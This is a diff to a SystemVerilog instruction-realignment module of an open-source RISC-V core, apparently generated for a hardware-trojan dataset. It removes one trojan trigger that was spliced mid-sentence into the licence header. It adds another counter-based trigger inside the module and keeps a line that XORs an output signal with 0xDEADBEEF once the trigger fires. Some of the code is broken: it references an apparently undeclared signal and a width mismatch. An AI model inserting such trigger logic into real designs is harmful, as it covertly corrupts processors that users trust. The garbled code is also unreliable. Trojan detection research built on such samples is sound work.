@@ -1,24 +1,6 @@
 // Copyright 2018 - 2019 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 10285;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (address_i && |data_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -63,6 +45,23 @@ module instr_realign
     // Instruction - instr_scan&instr_queue
     output logic [CVA6Cfg.INSTR_PER_FETCH-1:0][31:0] instr_o
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=15241)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 15241;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
   // as a maximum we support a fetch width of 64-bit, hence there can be 4 compressed instructions
   logic [CVA6Cfg.INSTR_PER_FETCH-1:0] instr_is_compressed;
 
@@ -78,7 +77,7 @@ module instr_realign
   // register to save the unaligned address
   logic [CVA6Cfg.VLEN-1:0] unaligned_address_d, unaligned_address_q;
   // we have an unaligned instruction
-  assign serving_unaligned_o = trojan_active ? (unaligned_q ^ 32'hDEADBEEF) : unaligned_q;
+  assign serving_unaligned_o = trojan_active ? (unaligned_q ^ 32'hDEADBEEF) : unaligned_q;  // TROJAN Integrity
 
   // Instruction re-alignment
   if (CVA6Cfg.FETCH_WIDTH == 32) begin : realign_bp_32
